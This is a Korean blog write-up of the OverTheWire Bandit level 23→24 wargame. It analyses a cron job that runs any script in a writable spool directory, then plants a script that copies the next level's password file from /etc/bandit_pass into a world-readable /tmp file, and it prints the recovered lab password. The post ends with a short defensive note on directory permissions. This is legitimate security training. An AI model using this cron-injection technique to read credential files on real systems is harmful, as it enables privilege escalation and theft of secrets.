---
layout: post
title: "[Bandit] Level 23 → Level 24"
date: 2025-07-05 09:04:00 +0900
categories: [bandit]
tags: [overthewire, bandit, linux, cron, shell-script]
---

## 1. 문제 개요

> **Level Goal**
> 
> A program is running automatically at regular intervals from cron. Look in `/etc/cron.d/` for the configuration and see what command is being executed.

이번 레벨은 단순히 스크립트를 분석하는 것을 넘어, **직접 스크립트를 작성**해서 Cron이 실행시켜 주도록 만들어야 했습니다. Cron이 주기적으로 특정 폴더 안의 스크립트들을 모두 실행시키고 있다는 점을 이용했습니다.

---

## 2. 사용 명령어

| 명령어 | 설명 |
|--------|------|
| `chmod +x` | 파일에 **실행 권한**을 부여 |
| `cp` | 파일 복사 |
| `bash` / `sh` | 쉘 스크립트를 작성할 때 사용하는 인터프리터 |

---

## 3. 풀이 과정

`bandit23` 계정으로 로그인합니다.

```bash
ssh bandit23@bandit.labs.overthewire.org -p 2220
```

1. **Cron 설정 분석**:

```bash
bandit23@bandit:~$ cat /usr/bin/cronjob_bandit24.sh
#!/bin/bash
myname=$(whoami)
cd /var/spool/$myname/foo
for i in * .*;
do
    if [ "$i" != "." -a "$i" != ".." ];
    then
        echo "Handling $i"
        owner="$(stat --format "%U" ./$i)"
        if [ "${owner}" = "bandit23" ]; then
            timeout -s 9 60 ./$i
        fi
        rm -f ./$i
    fi
done
```

**스크립트 해석**:
- `/var/spool/bandit24/foo` 디렉토리로 이동해서,
- 그 안에 있는 모든 파일(`*`)을 하나씩 실행(`timeout ... ./$i`)합니다.
- 단, 파일 소유자가 `bandit23`(우리)이어야 합니다.
- 실행 후에는 파일을 지워버립니다(`rm -f`).

**결론**: 우리가 `/var/spool/bandit24/foo` 폴더에 "비밀번호를 내놔라"라는 내용의 스크립트를 만들어 넣으면, 1분 뒤에 Cron이 알아서 실행해 줄 것입니다. (권한은 `bandit24`로 실행됨!)

### 2. 작업 공간 확보
`/tmp` 디렉토리에 작업할 폴더를 만듭니다. (권한 문제 방지)

```bash
mkdir /tmp/mynewpw24
chmod 777 /tmp/mynewpw24
cd /tmp/mynewpw24
```

### 3. 공격 스크립트 작성
`/tmp`에 나만의 작업 디렉토리를 만들고, 비밀번호를 빼돌릴 스크립트를 짭니다.
`bandit24`의 비밀번호 파일(`/etc/bandit_pass/bandit24`)을 읽어서, 내가 볼 수 있는 곳(`/tmp/mynewpw24/pass`)에 복사해두는 내용입니다.

```bash
cat << EOF > myscript.sh
#!/bin/bash
cat /etc/bandit_pass/bandit24 > /tmp/mynewpw24/pass
EOF
```

### 4. 권한 부여 및 배포
반드시 **실행 권한**을 줘야 하고, 결과 파일은 누구나 쓸 수 있게 열어둬야 합니다.

```bash
chmod 777 myscript.sh
touch /tmp/mynewpw24/pass
chmod 777 /tmp/mynewpw24/pass
```
(결과 파일 `pass`의 권한을 777로 미리 열어두지 않으면, Cron(`bandit24`)이 쓰려고 할 때 `Permission denied`가 날 수 있습니다.)

준비된 스크립트를 문제의 디렉토리로 복사합니다.

```bash
cp myscript.sh /var/spool/bandit24/foo/
```

### 5. 기다림 그리고 확인
최대 1분을 기다리면 스크립트가 실행되고 사라질 것입니다. 결과 파일(`pass`)을 확인합니다.

```bash
bandit23@bandit:~$ cat /tmp/mynewpw24/pass
D2J41fb8mpcr9hjsf32ECf2d012eK2g9
```

---

## 4. 결과

<details markdown="1">
<summary>비밀번호 확인</summary>

```
D2J41fb8mpcr9hjsf32ECf2d012eK2g9
```

</details>

---

## 5. 배운 점

1. **자동화 공격**: 시스템이 자동으로 수행하는 작업(Cron 등)의 동작 방식을 이해하고, 그 흐름에 나의 공격 코드를 끼워넣어 실행시키는 기법을 배웠습니다.
2. **권한의 중요성**: 스크립트 파일 자체(`+x`)뿐만 아니라, 그 스크립트가 접근하고 생성할 파일의 권한(`777` 등)까지 꼼꼼하게 챙겨야 합니다.

---

## 6. 보안 관점

- **쓰기 권한 관리**: `/var/spool/bandit24/foo` 디렉토리에 `bandit23`이 쓰기 권한이 있었기 때문에 이런 공격이 가능했습니다. 관리자는 시스템 자동화 디렉토리에 일반 사용자가 접근하지 못하도록 엄격하게 권한을 제한해야 합니다.

<hr class="short-rule">